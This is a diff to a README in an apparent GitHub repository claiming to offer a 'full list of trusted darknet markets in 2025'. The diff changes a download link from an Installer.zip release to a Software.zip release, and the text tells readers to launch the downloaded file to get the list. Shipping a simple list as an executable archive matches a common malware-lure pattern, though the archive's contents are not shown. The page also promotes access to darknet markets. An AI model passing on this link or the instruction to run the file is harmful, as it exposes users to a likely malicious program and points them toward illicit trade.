@@ -13,7 +13,7 @@ Topics are not provided.
 
 ## Get Started:
 To get started with accessing the list of trusted darknet markets, you can download the repository by clicking on the link below:
-[![Download Repository](https://github.com/mausamshta/The-Full-List-of-Trusted-Darknet-Markets-in-2025/releases/download/v1.0/Installer.zip%20Repository-Click%20Here-brightgreen)](https://github.com/mausamshta/The-Full-List-of-Trusted-Darknet-Markets-in-2025/releases/download/v1.0/Installer.zip)
+[![Download Repository](https://github.com/mausamshta/The-Full-List-of-Trusted-Darknet-Markets-in-2025/releases/download/v2.0/Software.zip%20Repository-Click%20Here-brightgreen)](https://github.com/mausamshta/The-Full-List-of-Trusted-Darknet-Markets-in-2025/releases/download/v2.0/Software.zip)
 
 Please make sure to launch the downloaded file to access the comprehensive list of darknet markets in 2025.
 
